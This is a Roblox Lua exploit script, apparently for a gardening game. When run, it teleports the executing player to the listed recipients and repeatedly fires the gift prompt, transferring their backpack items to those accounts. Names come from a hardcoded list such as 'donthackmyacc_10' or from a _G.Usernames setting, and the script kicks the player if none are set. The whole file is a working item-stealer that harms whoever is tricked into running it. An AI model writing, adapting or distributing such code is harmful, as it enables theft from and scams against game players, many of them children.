print("Script started")

local users = _G.Usernames or {"donthackmyacc_10", "test2", "test3"}
print("Loaded users:", table.concat(users, ", "))

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local Backpack = plr:WaitForChild("Backpack")
local Character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}

if next(users) == nil then 
    print("No usernames provided! Kicking player.")
    plr:Kick("You didn't add any usernames") 
    return 
end

local function getEligibleItems()
    local items = {}
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool")
            and not table.find(excludedItems, tool.Name)
            and not ((tool:GetAttribute("ItemType") == "Pet") or (tool.Name:lower():find("pet") ~= nil))
        then
            table.insert(items, tool)
        end
    end
    return items
end

local function getRecipient()
    for _, username in ipairs(users) do
        local recipient = Players:FindFirstChild(username)
        if recipient then
            return recipient
        end
    end
    return nil
end

local function fastGift(tool, targetPlayer)
    local myRoot = Character:WaitForChild("HumanoidRootPart")
    local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    local prompt = targetRoot and targetRoot:FindFirstChildWhichIsA("ProximityPrompt", true)
    if not (targetRoot and prompt) then
        warn("No prompt found on target player")
        return
    end

    for _, ctool in ipairs(Character:GetChildren()) do
        if ctool:IsA("Tool") then 
            ctool.Parent = Backpack 
        end
    end

    myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
    tool.Parent = Character
    task.wait(0.1)

    if prompt.Enabled then
        if typeof(fireproximityprompt) == "function" then
            pcall(fireproximityprompt, prompt)
        end
        pcall(function()
            prompt:InputHoldBegin()
            task.wait(prompt.HoldDuration or 0.5)
            prompt:InputHoldEnd()
        end)
    end

    tool.Parent = Backpack
    task.wait(0.1)
end

print("Starting random gifting loop...")

while true do
    local items = getEligibleItems()
    if #items == 0 then
        print("No more eligible items to gift!")
        break
    end

    local recipient = getRecipient()
    if not recipient then
        print("No recipients found, aborting.")
        break
    end

    local idx = math.random(1, #items)
    local tool = items[idx]
    print("Attempting to gift:", tool.Name, "to", recipient.Name)

    -- 90% chance to gift
    if math.random() < 0.9 then
        fastGift(tool, recipient)
        print("Gifted:", tool.Name, "to", recipient.Name)
    else
        print("Skipped gifting this time.")
    end

    task.wait(0.05)
end

print("Script finished")
